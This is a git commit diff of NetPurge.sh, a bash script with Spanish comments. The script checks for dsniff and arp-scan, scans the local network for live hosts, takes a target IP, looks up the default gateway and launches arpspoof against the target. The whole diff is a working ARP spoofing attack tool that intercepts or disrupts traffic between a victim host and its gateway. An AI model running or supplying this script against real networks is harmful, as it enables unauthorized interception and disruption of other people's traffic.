110bdd673e73cbde28f0e735972729ea0d45fe76
arbolencio <85744933+Arbolencio@users.noreply.github.com>
2024-02-25 20:43:45 +0100

    Update NetPurge.sh

--- NetPurge.sh
+++ NetPurge.sh
@@ -1,7 +1,6 @@
 #!/bin/bash 
 
-# ver si las herramintas estan disponibles 
-
+# Verificar si las herramientas están disponibles 
 check_herramientas() {
     if ! [ -x "$(command -v $1)" ]; then
         echo -e "\033[1;31m Error: $1 is not installed. Please install $1 and try again. \033[0m" >&2
@@ -13,8 +12,7 @@ check_herramientas "dsniff"
 check_herramientas "arp-scan"
 check_herramientas "netdiscover"
 
-#banner
-
+# Mostrar el banner
 echo -e "\033[1;35m    _______  _______  ______   _______  _        _______  _        _______ _________ _______ "
 echo "   (  ___  )(  ____ )(  ___ \ (  ___  )( \      (  ____ \( (    /|(  ____ \\\__   __/(  ___  )"
 echo "   | (   ) || (    )|| (   ) )| (   ) || (      | (    \/|  \  ( || (    \/   ) (   | (   ) |"
@@ -30,23 +28,30 @@ echo "                     |.  |   |_____|____|.  ____|_____|__| |___  |_____|"
 echo "                     |:  |   |          |:  |              |_____|"
 echo "                     |::.|   |          |::.|"
 echo "                     '--- ---'          '---'  v1.1  "
-      echo -e "\033[1;32m "
-      cat  dibujo.txt
-      echo -e " \033[0m"
+echo -e "\033[1;32m "
+cat dibujo.txt
+echo -e " \033[0m"
 
-#ver ips de la interfaz
+# Escanear la red para encontrar direcciones IP activas
 echo -e "\033[0;33m"
 read -p "Show interface ip: " red
+echo -e "\033[1;31mScanning network for active hosts...\033[0m"
 ips=$(arp-scan -I "$red" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
 
-#atacar la ip
-echo -e "\033[1;33m $ips"
-echo -e "\033[1;36m "
-read -p "the network you want to analyze: " interfaz
-echo -e "\033[1;35m "
-read -p "the target's ip: " ip
-puerta_enlace=$(echo $ip | sed 's/\([0-9]\+\)$/1/g')
+# Mostrar las direcciones IP encontradas
+echo -e "\033[1;33mActive hosts on the network:\033[0m"
+echo "$ips"
 
-#comando 
-arpspoof -i "$interfaz" -t "$ip" "$puerta_enlace"
-echo -e "\033[0"
+# leer la dirección IP 
+echo -e "\033[1;36m "
+read -p "Enter the target's IP: " ip
+
+# Calcular la dirección de la puerta de enlace
+puerta_enlace=$(ip route | grep default | awk '{print $3}')
+
+# ataque arp
+echo "Performing ARP spoofing attack against $ip..."
+arpspoof -i "$red" -t "$ip" "$puerta_enlace"
+
+# Limpiar y finalizar el script
+echo -e "\033[0m"
